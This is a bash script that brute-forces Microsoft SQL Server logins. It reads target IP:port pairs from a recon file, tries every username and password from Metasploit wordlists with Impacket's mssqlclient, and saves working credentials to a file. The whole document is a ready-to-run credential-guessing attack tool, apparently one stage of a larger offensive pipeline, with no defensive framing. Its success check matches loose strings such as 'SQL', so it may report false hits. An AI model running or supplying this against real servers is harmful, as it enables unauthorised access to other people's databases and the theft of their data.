#!/usr/bin/env bash

# Brute-forces MSSQL credentials using mssqlclient.
# Reads IP:PORT pairs from recon/hosts/mssql-targets.txt.
# Outputs confirmed credentials to recon/hosts/mssql-creds.txt.

OUTDIR="./recon"
TARGETS_FILE="$OUTDIR/hosts/mssql-targets.txt"
CREDS_OUT="$OUTDIR/hosts/mssql-creds.txt"
USERS_FILE="/usr/share/wordlists/metasploit/common_users.txt"
PASS_FILE="/usr/share/wordlists/metasploit/common_passwords.txt"

if [[ ! -f "$TARGETS_FILE" ]]; then
    echo "[-] $TARGETS_FILE not found. Run 01_recon first."
    exit 1
fi
if [[ ! -f "$USERS_FILE" ]]; then
    echo "[-] Users file not found: $USERS_FILE"
    exit 1
fi
if [[ ! -f "$PASS_FILE" ]]; then
    echo "[-] Passwords file not found: $PASS_FILE"
    exit 1
fi

echo "[*] Starting MSSQL brute-force against $(wc -l < "$TARGETS_FILE") target(s)"
echo "[*] Users:     $USERS_FILE ($(wc -l < "$USERS_FILE") entries)"
echo "[*] Passwords: $PASS_FILE ($(wc -l < "$PASS_FILE") entries)"
> "$CREDS_OUT"

while IFS=: read -r TARGET_IP TARGET_PORT; do
    echo "[*] Brute-forcing $TARGET_IP:$TARGET_PORT..."
    FOUND=0

    while read -r USER; do
        [[ $FOUND -eq 1 ]] && break
        while read -r PASS; do
            # Skip any of the blank lines
            [[ -z "$USER" || -z "$PASS" ]] && continue

            RESULT=$(printf 'exit\n' | \
                mssqlclient "${USER}:${PASS}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1)

            if echo "$RESULT" | grep -qi "SQL\|Impacket\|Press help"; then
                echo "[+] Found credentials: $USER:$PASS on $TARGET_IP:$TARGET_PORT"
                echo "$TARGET_IP:$TARGET_PORT:$USER:$PASS" >> "$CREDS_OUT"
                FOUND=1
                break
            fi
        done < "$PASS_FILE"
    done < "$USERS_FILE"

    if [[ $FOUND -eq 0 ]]; then
        echo "[-] No credentials found on $TARGET_IP:$TARGET_PORT"
    fi

done < "$TARGETS_FILE"

echo ""
FOUND_COUNT=$(wc -l < "$CREDS_OUT")
echo "[+] Done. $FOUND_COUNT credential set(s) saved to $CREDS_OUT"
if [[ $FOUND_COUNT -eq 0 ]]; then
    echo "[-] No valid credentials found. Cannot continue."
    exit 1
fi
cat "$CREDS_OUT" | sed 's/^/    /'
